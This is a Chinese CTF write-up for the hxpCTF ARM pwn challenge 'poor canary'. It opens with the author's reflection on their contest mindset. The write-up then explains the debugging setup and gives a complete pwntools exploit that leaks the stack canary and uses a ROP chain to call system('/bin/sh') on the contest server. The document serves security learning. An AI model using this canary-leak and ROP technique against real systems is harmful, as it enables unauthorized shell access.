# hxpCTF
## 总结反思
> 这次终于做出来了一道题，总结一下，和前面几次相比心态上还是有一些变化的。之前比赛的时候每次都很着急，总去看计分板和倒计时，一直处于担心自己什么也做不出来的情况，结果就真的什么都没做出来。可能是前面几次都经受了挫折，到这次心态就锻炼出来了，全程都是抱着做不出来就做不出来的心态在做，对结果没有报太大的期望，学到一点是一点。所以面对之前从没有接触过的arm架构的题也能够耐心去看，搭建环境，一步步解决问题，最后getshell的时候也真的非常激动，比做oj要开心好多！   
> 另外高兴过后还是要清醒地认识到自己的不足。知识过于海量，只能持续不断地慢慢学习，加油！

## Writeup
### poor canary
> 首先需要在本地搭建arm环境，安装qemu，使用gdb-multiarch调试。为使用pwntools输入不可见字符，可以在用socat在本地部署题目，然后gdb指定arch指定target跟进去调试。    
> 题目本身并不复杂，覆盖canary的0字节，然后puts泄露剩余字节，利用栈溢出补到对应位置，再找到gadget用rop劫持控制流。传参方式和指令集稍有不同。    

> 脚本如下：

    from pwn import*
	context(log_level="debug")
	#p=process('./test')
	p = remote('116.203.30.62',18113)
	#p=remote('127.0.0.1',10007)
	p.recvuntil('> ')

	p.send('a'*40+'B')
	p.recvuntil('B')
	canary=u32("\x00"+p.recv(3))
	log.info(canary)
	bina=0x71eb0
	sys=0x16d90
	r0=0x26b7c
	p.sendline("a"*40+p32(canary)+'a'*12+p32(r0)+p32(bina)+'a'*4+p32(sys))
	
	p.recvuntil('> ')
	p.send('\n')  
	    
	p.interactive()